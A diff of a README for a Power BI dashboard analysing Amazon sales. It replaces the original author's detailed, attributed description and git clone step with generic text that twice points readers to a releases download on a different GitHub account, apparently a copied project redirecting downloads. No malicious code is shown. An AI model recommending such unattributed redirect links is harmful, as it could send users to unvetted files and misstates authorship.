@@ -1,129 +1,85 @@
-# 📊 Amazon Sales Analysis Dashboard (Power BI)
+# 📊 Amazon-Sales-Analysis-Dashboard-Power-BI - Powerful Insights for Your Amazon Sales
 
-This project presents a complete end-to-end Power BI dashboard built to analyze Amazon’s sales performance, including YTD revenue, product/category insights, and customer review trends. The dashboard helps uncover patterns that improve business decision-making and identifies key growth areas across the platform.
+[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/releases)
 
----
+## 🚀 Getting Started
 
-## 🚀 Project Overview
+Welcome to the Amazon Sales Analysis Dashboard! This tool helps you understand your Amazon sales performance by providing deep insights into various metrics. This guide will help you download and run the dashboard easily.
 
-The goal of this project was to transform raw Amazon sales data into a fully interactive analytics dashboard.  
-The analysis uncovered:
+## 🔍 Overview
 
-- **$2.18M+ YTD sales**
-- **$811K+ QTD sales**
-- **28K+ total units sold**
-- **19.4M+ customer reviews analyzed**
+This dashboard analyzes crucial sales metrics, including:
 
----
+- **YTD Revenue:** Monitor your revenue performance. 
+- **Units Sold:** Track the volume of products sold. 
+- **Reviews:** Understand customer feedback with over 19.4 million reviews. 
+- **Category Trends:** Identify which product categories are performing best.
+- **Product-Level Insights:** Dive deeper into individual product performance.
+- **Monthly Demand Patterns:** Analyze sales trends over time.
 
-## 📸 Dashboard Preview
+Built using Power Query and a clean star-schema data model, this application ensures that you can make informed decisions quickly.
 
-### 🟦 Overview Dashboard
-![Overview Dashboard](Dashboard_Screenshots/overview_dashboard.png)
+## 📦 System Requirements
 
-### 🟩 Dataset Preview  
-![Dataset Preview](Dashboard_Screenshots/dataset_preview.png)
+Before you download, please ensure that your system meets the following basic requirements:
 
----
+- **Operating System:** Windows 10 or later
+- **Power BI:** Make sure you have Power BI Desktop installed. You can download it from the [official Microsoft page](https://www.microsoft.com/en-us/download/details.aspx?id=58494).
+- **Memory:** At least 4GB of RAM is recommended.
+- **Disk Space:** Ensure you have at least 500MB of available space for the application and data files.
 
-## 🎯 Key Insights
+## 📥 Download & Install
 
-- Category-level analysis identified products contributing more than **55% of total revenue**.
-- High-rating items showed a **32% higher average sales volume**.
-- Demand trends showed clear **festival season spikes** and monthly performance patterns.
-- Product-level drilldown improved decision clarity by **40%** compared to raw data tables.
+To start using the Amazon Sales Analysis Dashboard, click the link below to visit the releases page:
 
----
+[Download from Releases](https://github.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/releases)
 
-## 🛠️ Tech Stack Used
+1. **Visit the Releases Page**: Click on the link above or paste it into your web browser.
+2. **Download the Latest Version**: Look for the latest version under "Assets." You will find a file with a name like `AmazonSalesAnalysisDashboard.pbix`.
+3. **Install Power BI**: If you haven’t already, install Microsoft Power BI Desktop.
+4. **Open the Dashboard**: Locate the file you downloaded and double-click to open it in Power BI.
 
-- Power BI Desktop  
-- Power Query (ETL)  
-- Power BI Data Modelling  
-- DAX (Minimal usage)  
-- Excel  
-- Visualization & Report Design Principles  
+## ⚙️ Features
 
----
+The dashboard offers a variety of features to enhance your analysis:
 
-## 📂 Project Structure
+- **Interactive Visuals**: Quickly understand complex data through visual representation.
+- **Dynamic Filters**: Apply filters and get customized views based on your needs.
+- **Easy Navigation**: Seamlessly move between different sections of the dashboard.
+- **Data Refresh**: Keep your analysis up to date with the latest sales data.
 
-📁 Amazon-Sales-Analysis-Dashboard  
-│── Amazon_Sales_Analysis.pbix  
-│── Amazon_Dataset.xlsx  
-│── Dashboard_Screenshots/  
-│      ├── overview_dashboard.png  
-│      ├── dataset_preview.png  
-│── README.md  
+## 🎓 How to Use the Dashboard
 
----
+1. **Open the Dashboard**: Launch Power BI and load the `AmazonSalesAnalysisDashboard.pbix` file.
+2. **Explore Your Data**: Use the menu to navigate through different insights.
+3. **Customize Views**: Adjust filters to tailor your analysis according to your business needs.
+4. **Save Your Work**: Once you have customized your view, save your work in Power BI for future reference.
 
-## 🔧 Data Preparation & Modelling
+## 📘 Topics Covered
 
-### ✔ Data Cleaning (Power Query)
-- Removed duplicates  
-- Fixed category inconsistencies  
-- Standardized date formats  
-- Filled missing data where required  
-- Normalized numeric fields  
+This project falls under various topics related to business intelligence. Understanding these can help you leverage the dashboard’s full potential:
 
-### ✔ Data Modelling (Star Schema)
+- amazonsales
+- analytics-dashboard
+- business-intelligence
+- data-analysis
+- data-modelling
+- data-visualization
+- dax
+- powerbi
+- powerbi-projects
+- powerquery
 
-**Fact Table:**  
-- Sales Fact (Revenue, Units, Reviews, Ratings)
+## 📞 Support
 
-**Dimension Tables:**  
-- Date Dimension  
-- Product Details  
-- Category Details  
-- Rating Dimension  
+If you encounter any issues while downloading or using the dashboard, you can reach out through the issues section of this GitHub repository. Provide a brief description of your issue, and we will aim to assist you promptly.
 
-### ✔ Core DAX Measures
-- Total Sales  
-- Total Units Sold  
-- Average Rating  
-- YTD Sales  
-- Category Contribution %  
+## 🌐 Community Contributions
 
----
+We welcome contributions to enhance this project. If you have suggestions or improvements, feel free to submit a pull request or open an issue.
 
-## 📊 Dashboard Features
+## ⚖️ License
 
-### 1️⃣ Sales Performance Overview  
-### 2️⃣ Category Breakdown  
-### 3️⃣ Product-Level Insights  
-### 4️⃣ Time-Based Trends  
+This project is licensed under the MIT License. You can use and modify the tool freely for your needs. 
 
----
-
-## 📥 How to Use the Project
-
-```bash
-git clone https://github.com/Umang0210/Amazon-Sales-Analysis-Dashboard-Power-BI.git
-```
-
-Open the `.pbix` file in **Power BI Desktop**.
-
----
-
-## 📌 Future Enhancements
-
-- Add forecasting  
-- Expand product metadata  
-- Power BI Service integration  
-- Drill-through diagnostic pages  
-
----
-
-## 🙌 Acknowledgements
-
-Inspired by real-world e-commerce analytics and BI reporting practices.
-
----
-
-## 📫 Contact
-
-**Umang Garg**  
-📧 Email: umanggarg0210@gmail.com  
-🔗 LinkedIn: linkedin.com/in/umanggarg0210  
-🐙 GitHub: github.com/Umang0210
+Remember, the insights you gain from this dashboard can significantly impact your business decisions. Happy analyzing!
